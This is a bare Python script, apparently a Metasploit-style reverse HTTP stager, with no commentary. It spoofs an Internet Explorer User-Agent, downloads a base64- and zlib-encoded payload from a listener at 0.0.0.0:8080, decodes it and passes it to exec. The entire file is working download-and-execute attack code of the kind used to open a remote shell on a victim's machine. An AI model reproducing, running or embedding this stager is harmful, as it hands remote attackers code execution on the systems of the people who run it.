import zlib,base64,sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
hs=[]
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(zlib.decompress(base64.b64decode(o.open('http://0.0.0.0:8080/BGtTUgoL_BDQZ8VzseLrHAnUaokbPacH95jMGATAwtZPE6ThgawkeN2wdXTa4YcMYC0Rfafm07tPQP5urdgaatrGc4HjGSTzLB6e-A9oPwbxdtxTedZ6X-bGmkhcw591AgLMgqlFOTfmpXk1POKUbSVgPPm_djF6_GNg3hGiyLdjeM3NUsJXRJelyOGeLFUgzvQ0Lfi6ZxKGWv5_DCcmzWQ1ddCkqm33ZUKxW8HzvO').read())))
